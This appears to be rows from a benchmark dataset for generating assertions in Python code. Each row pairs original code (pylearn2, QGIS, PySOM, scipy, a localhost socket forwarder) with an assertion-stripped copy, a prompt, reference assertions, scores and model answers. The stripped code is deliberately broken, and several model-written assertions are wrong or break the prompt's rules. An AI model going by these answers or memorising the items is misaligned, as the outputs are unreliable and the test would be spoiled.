74        super(NORBSmall, self).__init__(X=X, y=y, y_labels=np.max(y) + 1,
75                                        view_converter=view_converter)
76
77
78class FoveatedNORB(dense_design_matrix.DenseDesignMatrix):
79
80    """"""
81    .. todo::
82
83        WRITEME
84
85    Parameters
86    ----------
87    which_set : WRITEME
88        One of ['train','test']
89    center : WRITEME
90        Data is in range [0,256], center=True subtracts 127.5.
91        # TODO: check this comment, sure it means {0, ..., 255}
92    scale : WRITEME
93    start : WRITEME
94    stop : WRITEME
95    restrict_instances : WRITEME
96    preprocessor : WRITEME
97    """"""
98
99    @classmethod
100    def load(cls, which_set):
101
102        base = '%s/norb_small/foveated/smallnorb-'
103        base = base % os.getenv('PYLEARN2_DATA_PATH')
104        if which_set == 'train':
105            base += '5x46789x9x18x6x2x96x96-training-dat'
106        else:
107            base += '5x01235x9x18x6x2x96x96-testing-dat'
108
109        fname = base + '.npy'
110        fname = datasetCache.cache_file(fname)
111        data = np.load(fname, 'r')
112        return data
113
114    def __init__(self, which_set, center=False, scale=False,
115                 start=None, stop=None, restrict_instances=None,
116                 preprocessor=None):
117
118        self.args = locals()
119
120        if which_set not in ['train', 'test']:
121            raise ValueError(""Unrecognized which_set value: "" + which_set)
122
123        X = FoveatedNORB.load(which_set)
124        X = np.cast['float32'](X)
125
126        # this is uint8
127        y = NORBSmall.load(which_set, 'cat')
128        y_extra = NORBSmall.load(which_set, 'info')
129
130        instance = y_extra[:, 0]
131        self.instance = instance
132
133        if center:
134            X -= 127.5
135            if scale:
136                X /= 127.5
137        else:
138            if scale:
139                X /= 255.
140
141        view_converter = retina.RetinaCodingViewConverter((96, 96, 2),
142                                                          (8, 4, 2, 2))
143
144        super(FoveatedNORB, self).__init__(X=X, y=y,
145                                           y_labels=np.max(y) + 1,
146                                           view_converter=view_converter,
147                                           preprocessor=preprocessor)
148
149        if restrict_instances is not None:
150            self.restrict_instances(restrict_instances)
151
152        self.restrict(start, stop)
153
154        self.y = self.y.astype('float32')
155
156    def get_test_set(self):
157        """"""
158        .. todo::
159
160            WRITEME
161        """"""
162        test_args = {'which_set': 'test'}
163
164        for key in self.args:
165            if key in ['which_set', 'restrict_instances',
166                       'self', 'start', 'stop']:
167                continue
168            test_args[key] = self.args[key]
169
170        return FoveatedNORB(**test_args)
171
172    def restrict_instances(self, instances):
173        """"""
174        .. todo::
175
176            WRITEME
177        """"""
178        mask = reduce(np.maximum, [self.instance == ins for ins in instances])
179        mask = mask.astype('bool')
180        self.instance = self.instance[mask]
181        self.X = self.X[mask, :]
182        if self.y.ndim == 2:
183            self.y = self.y[mask, :]
184        else:
185            self.y = self.y[mask]
186        expected = sum([(self.instance == ins).sum() for ins in instances])
187",7136,"[[32, 'which_set', '!=', '', 'checks that function input which_set is not an empty string'],
 [32, 'desc', '!=', '', 'checks that function input desc is not an empty string'],
 [55, 'X', '>=', 0, 'ensures that the variable X contains at least one element'],
 [55, 'y', '>=', 0, 'ensures that the variable y contains at least one element'],
 [56, 'which_set', '!=', '', 'checks that function input which_set is not an empty string'],
 [114, 'X', '>=', 0, 'ensures that the variable X contains at least one element'],
 [114, 'y', '>=', 0, 'ensures that the variable y contains at least one element'],
 [115, 'which_set', '!=', '', 'checks that function input which_set is not an empty string'],
 [172, 'instances', '>=', 0, 'ensures that the variable instances contains at least one element'],
 [172, 'self.instance', '>=', 0, 'ensures that the variable self.instance contains at least one element'],
 [186, 'expected', '>=', 0, 'ensures that the variable expected is not negative']]"
tudorbarascu/QGIS,"# -*- coding: utf-8 -*-
""""""QGIS Unit tests for QgsClassificationMethod implementations

.. note:: This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
""""""
__author__ = 'Denis Rouzaud'
__date__ = '3/09/2019'
__copyright__ = 'Copyright 2019, The QGIS Project'

import qgis  # NOQA

from qgis.testing import unittest, start_app
from qgis.core import QgsClassificationMethod, QgsClassificationLogarithmic, QgsFeature, QgsVectorLayer, QgsPointXY, \
    QgsGeometry


start_app()

#===========================================================
# Utility functions


def createMemoryLayer(values):
    ml = QgsVectorLayer(""Point?crs=epsg:4236&field=id:integer&field=value:double"",
                        ""test_data"", ""memory"")
    # Data as list of x, y, id, value
    assert ml.isValid()
    pr = ml.dataProvider()
    fields = pr.fields()
    id = 0
    for value in values:
        id += 1
        feat = QgsFeature(fields)
        feat['id'] = id
        feat['value'] = value
        g = QgsGeometry.fromPointXY(QgsPointXY(id / 100, id / 100))
        feat.setGeometry(g)
        pr.addFeatures([feat])
    ml.updateExtents()
    return ml


class TestQgsClassificationMethods(unittest.TestCase):

    def testQgsClassificationLogarithmic(self):
        values = [2746.71,
                  66667.49,
                  77282.52,
                  986567.01,
                  1729508.41,
                  9957836.86,
                  35419826.29,
                  52584164.80,
                  296572842.00]

        vl = createMemoryLayer(values)

        m = QgsClassificationLogarithmic()
        r = m.classes(vl, 'value', 9)

        self.assertEqual(r.count(), 6)
        self.assertEqual(r[0].label(), '2746.71 - 10^4')
        self.assertEqual(QgsClassificationMethod.listToValues(r),
                         [10000.0, 100000.0, 1000000.0, 10000000.0, 100000000.0, 1000000000.0])

        self.assertEqual(m.classes(vl, 'value', 4).count(), 4)


if __name__ == ""__main__"":
    unittest.main()
","
1# -*- coding: utf-8 -*-
2""""""QGIS Unit tests for QgsClassificationMethod implementations
3
4.. note:: This program is free software; you can redistribute it and/or modify
5it under the terms of the GNU General Public License as published by
6the Free Software Foundation; either version 2 of the License, or
7(at your option) any later version.
8""""""
9__author__ = 'Denis Rouzaud'
10__date__ = '3/09/2019'
11__copyright__ = 'Copyright 2019, The QGIS Project'
12
13import qgis  # NOQA
14
15from qgis.testing import unittest, start_app
16from qgis.core import QgsClassificationMethod, QgsClassificationLogarithmic, QgsFeature, QgsVectorLayer, QgsPointXY, \
17    QgsGeometry
18
19
20start_app()
21
22#===========================================================
23# Utility functions
24
25
26def createMemoryLayer(values):
27    ml = QgsVectorLayer(""Point?crs=epsg:4236&field=id:integer&field=value:double"",
28                        ""test_data"", ""memory"")
29    # Data as list of x, y, id, value
30    pr = ml.dataProvider()
31    fields = pr.fields()
32    id = 0
33    for value in values:
34        id += 1
35        feat = QgsFeature(fields)
36        feat['id'] = id
37        feat['value'] = value
38        g = QgsGeometry.fromPointXY(QgsPointXY(id / 100, id / 100))
39        feat.setGeometry(g)
40        pr.addFeatures([feat])
41    ml.updateExtents()
42    return ml
43
44
45class TestQgsClassificationMethods(unittest.TestCase):
46
47    def testQgsClassificationLogarithmic(self):
48        values = [2746.71,
49                  66667.49,
50                  77282.52,
51                  986567.01,
52                  1729508.41,
53                  9957836.86,
54                  35419826.29,
55                  52584164.80,
56                  296572842.00]
57
58        vl = createMemoryLayer(values)
59
60        m = QgsClassificationLogarithmic()
61        r = m.classes(vl, 'value', 9)
62
63                         [10000.0, 100000.0, 1000000.0, 10000000.0, 100000000.0, 1000000000.0])
64
65
66
67if __name__ == ""__main__"":
68    unittest.main()
69","[['ml.isValid()', '==', 'True']]",5,1,0.2,0.0004566210045662,"['__author__', '__date__', '__copyright__', 'values', 'ml', 'pr', 'fields', 'id', 'feat', ""feat['id']"", ""feat['value']"", 'g', 'vl', 'm', 'r']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__author__', '__date__', '__copyright__', 'values', 'ml', 'pr', 'fields', 'id', 'feat', ""feat['id']"", ""feat['value']"", 'g', 'vl', 'm', 'r']
*Code:

1# -*- coding: utf-8 -*-
2""""""QGIS Unit tests for QgsClassificationMethod implementations
3
4.. note:: This program is free software; you can redistribute it and/or modify
5it under the terms of the GNU General Public License as published by
6the Free Software Foundation; either version 2 of the License, or
7(at your option) any later version.
8""""""
9__author__ = 'Denis Rouzaud'
10__date__ = '3/09/2019'
11__copyright__ = 'Copyright 2019, The QGIS Project'
12
13import qgis  # NOQA
14
15from qgis.testing import unittest, start_app
16from qgis.core import QgsClassificationMethod, QgsClassificationLogarithmic, QgsFeature, QgsVectorLayer, QgsPointXY, \
17    QgsGeometry
18
19
20start_app()
21
22#===========================================================
23# Utility functions
24
25
26def createMemoryLayer(values):
27    ml = QgsVectorLayer(""Point?crs=epsg:4236&field=id:integer&field=value:double"",
28                        ""test_data"", ""memory"")
29    # Data as list of x, y, id, value
30    pr = ml.dataProvider()
31    fields = pr.fields()
32    id = 0
33    for value in values:
34        id += 1
35        feat = QgsFeature(fields)
36        feat['id'] = id
37        feat['value'] = value
38        g = QgsGeometry.fromPointXY(QgsPointXY(id / 100, id / 100))
39        feat.setGeometry(g)
40        pr.addFeatures([feat])
41    ml.updateExtents()
42    return ml
43
44
45class TestQgsClassificationMethods(unittest.TestCase):
46
47    def testQgsClassificationLogarithmic(self):
48        values = [2746.71,
49                  66667.49,
50                  77282.52,
51                  986567.01,
52                  1729508.41,
53                  9957836.86,
54                  35419826.29,
55                  52584164.80,
56                  296572842.00]
57
58        vl = createMemoryLayer(values)
59
60        m = QgsClassificationLogarithmic()
61        r = m.classes(vl, 'value', 9)
62
63                         [10000.0, 100000.0, 1000000.0, 10000000.0, 100000000.0, 1000000000.0])
64
65
66
67if __name__ == ""__main__"":
68    unittest.main()
69",3592,"[[26, 'values', '!=', None, ""the 'values' cannot be None when creating the memory layer""],
[46, 'values', '!=', None, ""'values' cannot be None when testing classification""],
[60, 'vl', '!=', None, ""'vl' cannot be None when classifying""],
[61, 'm', '!=', None, ""'m' cannot be None when classifying""]]"
depaolim/wrun,"import selectors
import socket


class Log:
    @classmethod
    def debug(cls, msg, *args):
        print(msg, *args)


log = Log()


class Host:
    def __init__(self, pool, sock=None):
        self.pool = pool
        self.sock = sock or socket.socket()
        self.sock.setblocking(False)
        log.debug(""Host.__init__"", self.sock)
        self._dispatch = None

    def set_dispatch(self, _dispatch):
        assert not self._dispatch
        self._dispatch = _dispatch
        self.pool.register(self.sock, selectors.EVENT_READ, self.read)

    def read(self, data):
        assert False, ""to be implemented""

    def destroy(self):
        log.debug(""Host.Destroy"", self.sock)
        self.pool.unregister(self.sock)
        self.sock.close()


class Connection(Host):
    def read(self, sock):
        assert sock == self.sock
        data = self.sock.recv(1024)
        self._dispatch(data)

    def write(self, data):
        self.sock.sendall(data)


class NewConnection(Connection):
    def __init__(self, pool, address):
        super().__init__(pool)
        self.sock.connect_ex(address)


class Listener(Host):
    def __init__(self, pool, address):
        super().__init__(pool)
        self.sock.bind(address)
        self.sock.listen()

    def read(self, sock):
        assert sock == self.sock
        client_socket, client_address = sock.accept()
        log.debug(""new Connection"", client_socket)
        client = Connection(self.pool, client_socket)
        self._dispatch(client)


class Channel:
    def __init__(self, client, remote):
        self.client = client
        self.remote = remote
        self.client.set_dispatch(self.client_data)
        self.remote.set_dispatch(self.remote_data)

    def client_data(self, data):
        log.debug(""read_client"", data)
        if data:
            log.debug(""remote send..."")
            self.remote.write(data)
        # TODO: ... perché è necessario?!?
        if data == b'\xe0\x00':
            log.debug(""client disconnect"")
            self.client.destroy()

    def remote_data(self, data):
        log.debug(""read_remote"", data)
        if data:
            log.debug(""client send..."")
            self.client.write(data)
        else:
            log.debug(""remote disconnect"")
            self.remote.destroy()


class Broker:
    def __init__(self):
        self.hosts = selectors.DefaultSelector()
        self.doorkeeper = Listener(self.hosts, (""localhost"", 1883))
        self.doorkeeper.set_dispatch(self.create)

    def create(self, client):
        remote = NewConnection(self.hosts, (""localhost"", 1884))
        Channel(client, remote)

    def process(self):
        selected = self.hosts.select(timeout=1)
        if not selected:
            log.debug(""select timeout"")
            return
        for key, mask in selected:
            callback = key.data
            callback(key.fileobj)

    def stop(self):
        self.doorkeeper.destroy()
        self.hosts.close()
","
1import selectors
2import socket
3
4
5class Log:
6    @classmethod
7    def debug(cls, msg, *args):
8        print(msg, *args)
9
10
11log = Log()
12
13
14class Host:
15    def __init__(self, pool, sock=None):
16        self.pool = pool
17        self.sock = sock or socket.socket()
18        self.sock.setblocking(False)
19        log.debug(""Host.__init__"", self.sock)
20        self._dispatch = None
21
22    def set_dispatch(self, _dispatch):
23        self._dispatch = _dispatch
24        self.pool.register(self.sock, selectors.EVENT_READ, self.read)
25
26    def read(self, data):
27
28    def destroy(self):
29        log.debug(""Host.Destroy"", self.sock)
30        self.pool.unregister(self.sock)
31        self.sock.close()
32
33
34class Connection(Host):
35    def read(self, sock):
36        data = self.sock.recv(1024)
37        self._dispatch(data)
38
39    def write(self, data):
40        self.sock.sendall(data)
41
42
43class NewConnection(Connection):
44    def __init__(self, pool, address):
45        super().__init__(pool)
46        self.sock.connect_ex(address)
47
48
49class Listener(Host):
50    def __init__(self, pool, address):
51        super().__init__(pool)
52        self.sock.bind(address)
53        self.sock.listen()
54
55    def read(self, sock):
56        client_socket, client_address = sock.accept()
57        log.debug(""new Connection"", client_socket)
58        client = Connection(self.pool, client_socket)
59        self._dispatch(client)
60
61
62class Channel:
63    def __init__(self, client, remote):
64        self.client = client
65        self.remote = remote
66        self.client.set_dispatch(self.client_data)
67        self.remote.set_dispatch(self.remote_data)
68
69    def client_data(self, data):
70        log.debug(""read_client"", data)
71        if data:
72            log.debug(""remote send..."")
73            self.remote.write(data)
74        # TODO: ... perché è necessario?!?
75        if data == b'\xe0\x00':
76            log.debug(""client disconnect"")
77            self.client.destroy()
78
79    def remote_data(self, data):
80        log.debug(""read_remote"", data)
81        if data:
82            log.debug(""client send..."")
83            self.client.write(data)
84        else:
85            log.debug(""remote disconnect"")
86            self.remote.destroy()
87
88
89class Broker:
90    def __init__(self):
91        self.hosts = selectors.DefaultSelector()
92        self.doorkeeper = Listener(self.hosts, (""localhost"", 1883))
93        self.doorkeeper.set_dispatch(self.create)
94
95    def create(self, client):
96        remote = NewConnection(self.hosts, (""localhost"", 1884))
97        Channel(client, remote)
98
99    def process(self):
100        selected = self.hosts.select(timeout=1)
101        if not selected:
102            log.debug(""select timeout"")
103            return
104        for key, mask in selected:
105            callback = key.data
106            callback(key.fileobj)
107
108    def stop(self):
109        self.doorkeeper.destroy()
110        self.hosts.close()
111","[['self._dispatch', '==', 'False'], ['False', '==', 'True'], ['sock', '==', 'self.sock'], ['sock', '==', 'self.sock']]",4,4,1.0,0.001344537815126,"['cls', 'msg', '*args', 'log', 'pool', 'sock', 'self.pool', 'self.sock', 'self._dispatch', '_dispatch', 'data', 'address', 'client_socket', 'client_address', 'client', 'remote', 'self.client', 'self.remote', 'self.hosts', 'self.doorkeeper', 'selected', 'callback']",22,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['cls', 'msg', '*args', 'log', 'pool', 'sock', 'self.pool', 'self.sock', 'self._dispatch', '_dispatch', 'data', 'address', 'client_socket', 'client_address', 'client', 'remote', 'self.client', 'self.remote', 'self.hosts', 'self.doorkeeper', 'selected', 'callback']
*Code:

1import selectors
2import socket
3
4
5class Log:
6    @classmethod
7    def debug(cls, msg, *args):
8        print(msg, *args)
9
10
11log = Log()
12
13
14class Host:
15    def __init__(self, pool, sock=None):
16        self.pool = pool
17        self.sock = sock or socket.socket()
18        self.sock.setblocking(False)
19        log.debug(""Host.__init__"", self.sock)
20        self._dispatch = None
21
22    def set_dispatch(self, _dispatch):
23        self._dispatch = _dispatch
24        self.pool.register(self.sock, selectors.EVENT_READ, self.read)
25
26    def read(self, data):
27
28    def destroy(self):
29        log.debug(""Host.Destroy"", self.sock)
30        self.pool.unregister(self.sock)
31        self.sock.close()
32
33
34class Connection(Host):
35    def read(self, sock):
36        data = self.sock.recv(1024)
37        self._dispatch(data)
38
39    def write(self, data):
40        self.sock.sendall(data)
41
42
43class NewConnection(Connection):
44    def __init__(self, pool, address):
45        super().__init__(pool)
46        self.sock.connect_ex(address)
47
48
49class Listener(Host):
50    def __init__(self, pool, address):
51        super().__init__(pool)
52        self.sock.bind(address)
53        self.sock.listen()
54
55    def read(self, sock):
56        client_socket, client_address = sock.accept()
57        log.debug(""new Connection"", client_socket)
58        client = Connection(self.pool, client_socket)
59        self._dispatch(client)
60
61
62class Channel:
63    def __init__(self, client, remote):
64        self.client = client
65        self.remote = remote
66        self.client.set_dispatch(self.client_data)
67        self.remote.set_dispatch(self.remote_data)
68
69    def client_data(self, data):
70        log.debug(""read_client"", data)
71        if data:
72            log.debug(""remote send..."")
73            self.remote.write(data)
74        # TODO: ... perché è necessario?!?
75        if data == b'\xe0\x00':
76            log.debug(""client disconnect"")
77            self.client.destroy()
78
79    def remote_data(self, data):
80        log.debug(""read_remote"", data)
81        if data:
82            log.debug(""client send..."")
83            self.client.write(data)
84        else:
85            log.debug(""remote disconnect"")
86            self.remote.destroy()
87
88
89class Broker:
90    def __init__(self):
91        self.hosts = selectors.DefaultSelector()
92        self.doorkeeper = Listener(self.hosts, (""localhost"", 1883))
93        self.doorkeeper.set_dispatch(self.create)
94
95    def create(self, client):
96        remote = NewConnection(self.hosts, (""localhost"", 1884))
97        Channel(client, remote)
98
99    def process(self):
100        selected = self.hosts.select(timeout=1)
101        if not selected:
102            log.debug(""select timeout"")
103            return
104        for key, mask in selected:
105            callback = key.data
106            callback(key.fileobj)
107
108    def stop(self):
109        self.doorkeeper.destroy()
110        self.hosts.close()
111",4703,"[[15, 'pool', '!=', None, ""pool cannot be None because it's used to initialize Host""],
[15, 'sock', '!=', None, ""sock cannot be None because it's used to initialize Host""],
[34, 'data', '!=', None, ""data cannot be None because it's used in read method""],
[44, 'pool', '!=', None, ""pool cannot be None because it's needed to initialize NewConnection""],
[44, 'address', '!=', None, ""address cannot be None because it's used for making a connection""],
[50, 'pool', '!=', None, ""pool cannot be None, it's used to initialize Listener""],
[50, 'address', '!=', None, ""address cannot be None, it's used to bind socket""],
[63, 'client', '!=', None, ""client cannot be None, it's used to initialize Channel""],
[63, 'remote', '!=', None, ""remote cannot be None, it's used to initialize Channel""],
[69, 'data', '!=', None, ""data from the client should not be None""],
[79, 'data', '!=', None, ""data from remote should not be None""],
[95, 'client', '!=', None, ""client should not be None when creating a Channel""],
[104, 'key', '!=', None, ""key cannot be None because it's used in process method""],
[104, 'mask', '!=', None, ""mask cannot be None, it's used in process method""]]"
smarr/PySOM,"from som.interpreter.ast.nodes.expression_node import ExpressionNode
from som.vm.globals import trueObject, falseObject


class AndInlinedNode(ExpressionNode):

    _immutable_fields_ = [""_rcvr_expr?"", ""_arg_expr?""]
    _child_nodes_ = [""_rcvr_expr"", ""_arg_expr""]

    def __init__(self, rcvr_expr, arg_expr, source_section):
        ExpressionNode.__init__(self, source_section)
        self._rcvr_expr = self.adopt_child(rcvr_expr)
        self._arg_expr = self.adopt_child(arg_expr)

    def execute(self, frame):
        result = self._rcvr_expr.execute(frame)
        if result is trueObject:
            return self._arg_expr.execute(frame)
        assert result is falseObject
        return falseObject


class OrInlinedNode(ExpressionNode):

    _immutable_fields_ = [""_rcvr_expr?"", ""_arg_expr?""]
    _child_nodes_ = [""_rcvr_expr"", ""_arg_expr""]

    def __init__(self, rcvr_expr, arg_expr, source_section):
        ExpressionNode.__init__(self, source_section)
        self._rcvr_expr = self.adopt_child(rcvr_expr)
        self._arg_expr = self.adopt_child(arg_expr)

    def execute(self, frame):
        result = self._rcvr_expr.execute(frame)
        if result is trueObject:
            return trueObject
        assert result is falseObject
        return self._arg_expr.execute(frame)
","
1from som.interpreter.ast.nodes.expression_node import ExpressionNode
2from som.vm.globals import trueObject, falseObject
3
4
5class AndInlinedNode(ExpressionNode):
6
7    _immutable_fields_ = [""_rcvr_expr?"", ""_arg_expr?""]
8    _child_nodes_ = [""_rcvr_expr"", ""_arg_expr""]
9
10    def __init__(self, rcvr_expr, arg_expr, source_section):
11        ExpressionNode.__init__(self, source_section)
12        self._rcvr_expr = self.adopt_child(rcvr_expr)
13        self._arg_expr = self.adopt_child(arg_expr)
14
15    def execute(self, frame):
16        result = self._rcvr_expr.execute(frame)
17        if result is trueObject:
18            return self._arg_expr.execute(frame)
19        return falseObject
20
21
22class OrInlinedNode(ExpressionNode):
23
24    _immutable_fields_ = [""_rcvr_expr?"", ""_arg_expr?""]
25    _child_nodes_ = [""_rcvr_expr"", ""_arg_expr""]
26
27    def __init__(self, rcvr_expr, arg_expr, source_section):
28        ExpressionNode.__init__(self, source_section)
29        self._rcvr_expr = self.adopt_child(rcvr_expr)
30        self._arg_expr = self.adopt_child(arg_expr)
31
32    def execute(self, frame):
33        result = self._rcvr_expr.execute(frame)
34        if result is trueObject:
35            return trueObject
36        return self._arg_expr.execute(frame)
37","[['result', '==', 'falseObject'], ['result', '==', 'falseObject']]",2,2,1.0,0.0015384615384615,"['_immutable_fields_', '_child_nodes_', 'rcvr_expr', 'arg_expr', 'source_section', 'self._rcvr_expr', 'self._arg_expr', 'frame', 'result']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_immutable_fields_', '_child_nodes_', 'rcvr_expr', 'arg_expr', 'source_section', 'self._rcvr_expr', 'self._arg_expr', 'frame', 'result']
*Code:

1from som.interpreter.ast.nodes.expression_node import ExpressionNode
2from som.vm.globals import trueObject, falseObject
3
4
5class AndInlinedNode(ExpressionNode):
6
7    _immutable_fields_ = [""_rcvr_expr?"", ""_arg_expr?""]
8    _child_nodes_ = [""_rcvr_expr"", ""_arg_expr""]
9
10    def __init__(self, rcvr_expr, arg_expr, source_section):
11        ExpressionNode.__init__(self, source_section)
12        self._rcvr_expr = self.adopt_child(rcvr_expr)
13        self._arg_expr = self.adopt_child(arg_expr)
14
15    def execute(self, frame):
16        result = self._rcvr_expr.execute(frame)
17        if result is trueObject:
18            return self._arg_expr.execute(frame)
19        return falseObject
20
21
22class OrInlinedNode(ExpressionNode):
23
24    _immutable_fields_ = [""_rcvr_expr?"", ""_arg_expr?""]
25    _child_nodes_ = [""_rcvr_expr"", ""_arg_expr""]
26
27    def __init__(self, rcvr_expr, arg_expr, source_section):
28        ExpressionNode.__init__(self, source_section)
29        self._rcvr_expr = self.adopt_child(rcvr_expr)
30        self._arg_expr = self.adopt_child(arg_expr)
31
32    def execute(self, frame):
33        result = self._rcvr_expr.execute(frame)
34        if result is trueObject:
35            return trueObject
36        return self._arg_expr.execute(frame)
37",2810,"[[10, 'rcvr_expr', '!=', None, ""receiver expression 입력이 필요하다.""],
[10, 'arg_expr', '!=', None, ""argument expression 입력이 필요하다.""],
[10, 'source_section', '!=', None, ""source section 입력이 필요하다.""],
[15, 'frame', '!=', None, ""frame 입력이 필요하다.""],
[17, 'result', '==', 'trueObject', ""trueObject 반환될 경우 예상되며, 다른 결과는 오류이다.""],
[36, 'result', '==', 'trueObject', ""trueObject 반환될 경우 예상되며, 다른 결과는 오류이다.""],
[27, 'rcvr_expr', '!=', None, ""receiver expression 입력이 필요하다.""],
[27, 'arg_expr', '!=', None, ""argument expression 입력이 필요하다.""],
[27, 'source_section', '!=', None, ""source section 입력이 필요하다.""],
[32, 'frame', '!=', None, ""frame 입력이 필요하다.""]]"
arokem/scipy,"import numpy as np
import scipy.special as sc
from numpy.testing import assert_almost_equal, assert_array_equal


class TestPdtr(object):
    def test(self):
        val = sc.pdtr(0, 1)
        assert_almost_equal(val, np.exp(-1))

    def test_m_zero(self):
        val = sc.pdtr([0, 1, 2], 0)
        assert_array_equal(val, [1, 1, 1])

    def test_rounding(self):
        double_val = sc.pdtr([0.1, 1.1, 2.1], 1.0)
        int_val = sc.pdtr([0, 1, 2], 1.0)
        assert_array_equal(double_val, int_val)

    def test_inf(self):
        val = sc.pdtr(np.inf, 1.0)
        assert_almost_equal(val, 1.0)

    def test_domain(self):
        val = sc.pdtr(-1.1, 1.0)
        assert np.isnan(val)

class TestPdtrc(object):
    def test_value(self):
        val = sc.pdtrc(0, 1)
        assert_almost_equal(val, 1 - np.exp(-1))

    def test_m_zero(self):
        val = sc.pdtrc([0, 1, 2], 0.0)
        assert_array_equal(val, [0, 0, 0])

    def test_rounding(self):
        double_val = sc.pdtrc([0.1, 1.1, 2.1], 1.0)
        int_val = sc.pdtrc([0, 1, 2], 1.0)
        assert_array_equal(double_val, int_val)

    def test_inf(self):
        val = sc.pdtrc(np.inf, 1.0)
        assert_almost_equal(val, 0.0)

    def test_domain(self):
        val = sc.pdtrc(-1.1, 1.0)
        assert np.isnan(val)
","
1import numpy as np
2import scipy.special as sc
3
4
5class TestPdtr(object):
6    def test(self):
7        val = sc.pdtr(0, 1)
8
9    def test_m_zero(self):
10        val = sc.pdtr([0, 1, 2], 0)
11
12    def test_rounding(self):
13        double_val = sc.pdtr([0.1, 1.1, 2.1], 1.0)
14        int_val = sc.pdtr([0, 1, 2], 1.0)
15
16    def test_inf(self):
17        val = sc.pdtr(np.inf, 1.0)
18
19    def test_domain(self):
20        val = sc.pdtr(-1.1, 1.0)
21
22class TestPdtrc(object):
23    def test_value(self):
24        val = sc.pdtrc(0, 1)
25
26    def test_m_zero(self):
27        val = sc.pdtrc([0, 1, 2], 0.0)
28
29    def test_rounding(self):
30        double_val = sc.pdtrc([0.1, 1.1, 2.1], 1.0)
31        int_val = sc.pdtrc([0, 1, 2], 1.0)
32
33    def test_inf(self):
34        val = sc.pdtrc(np.inf, 1.0)
35
36    def test_domain(self):
37        val = sc.pdtrc(-1.1, 1.0)
38","[['np.isnan(val)', '==', 'True'], ['np.isnan(val)', '==', 'True']]",11,2,0.1818181818181818,0.0015384615384615,"['val', 'double_val', 'int_val']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['val', 'double_val', 'int_val']
*Code:

1import numpy as np
2import scipy.special as sc
3
4
5class TestPdtr(object):
6    def test(self):
7        val = sc.pdtr(0, 1)
8
9    def test_m_zero(self):
10        val = sc.pdtr([0, 1, 2], 0)
11
12    def test_rounding(self):
13        double_val = sc.pdtr([0.1, 1.1, 2.1], 1.0)
14        int_val = sc.pdtr([0, 1, 2], 1.0)
15
16    def test_inf(self):
17        val = sc.pdtr(np.inf, 1.0)
18
19    def test_domain(self):
20        val = sc.pdtr(-1.1, 1.0)
21
22class TestPdtrc(object):
23    def test_value(self):
24        val = sc.pdtrc(0, 1)
25
26    def test_m_zero(self):
